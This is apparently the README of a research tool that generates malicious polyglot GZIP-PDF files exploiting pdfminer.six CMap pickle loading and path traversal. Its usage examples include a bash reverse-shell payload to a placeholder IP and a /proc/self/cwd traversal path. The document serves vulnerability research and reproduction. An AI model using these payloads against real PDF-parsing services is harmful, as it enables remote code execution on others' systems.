# Pdfminer CMap Generator

A research tool to build polyglot GZIP-PDF files, with exploiting pdfminer CMap loading. Sharing reproduction and security research

## Introduce

**Background**

- pdfminer.six <= ALL
- 使用 pdfminer 进行 PDF 解析应用程序

**Functions**

- 生成恶意文件 PDF、Ployglot - GZIP and PDF；PDF 生成支持两种触发方式：CMap 加载和 XObject 路径穿越
- 文件验证功能
- 便于复现的 Docker 环境

## Usage
```
Usage: python3 pcg.py [options] --help
       python3 pcg.py build -t gzip -p "echo 111 >> uploads/1.txt"
       python3 pcg.py build -t pdf -ep "/proc/self/cwd/uploads/l1"

positional arguments:
  {build,validate,run}
    build               build a polyglot gzip-pdf file
    validate            Validate file

options:
  -h, --help            show this help message and exit
```

build

```
usage:  build [-h] -t {gzip,pdf} [-ptt {cmap,traversal}] [-ep ENCODING_PATH] [-p PAYLOAD] [-o OUTPUT]

options:
  -h, --help            show this help message and exit
  -t {gzip,pdf}, --type {gzip,pdf}
                        Select GZIP or PDF
  -ptt {cmap,traversal}, --pdf-trigger-type {cmap,traversal}
                        PDF trigger type: cmap (CMap loading) or traversal (XObject traversal)
  -ep ENCODING_PATH, --encoding-path ENCODING_PATH
                        PDF - Absolute path, but no suffix, Example: /proc/self/cwd/uploads/l1
  -p PAYLOAD, --payload PAYLOAD
                        GZIP - CMap Pickle.loads Payload, Example: bash -c 'bash -i >& /dev/tcp/ip/5555 0>&1'
  -o OUTPUT, --output OUTPUT
```

validate

```
l1n@servers:~/docker$ python3 github/Pdfminer_CMap_Generator/src/pcg.py validate --help
usage:  validate [-h] [-f FILE]

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Plotgloy gzip-pdf file path
```

## Research
[研究文章](https://github.com/L1nq0/Pdfminer-CMap-Generator/blob/master/research/Pdfminer-Vulnerability-Research.md)

[复现环境](https://github.com/L1nq0/Pdfminer-CMap-Generator/tree/master/research/lab/pdf2text_debug)

## References

https://github.com/pdfminer/pdfminer.six

https://blog.wm-team.cn/index.php/archives/86/

https://www.cnblogs.com/L1nq/p/19124085

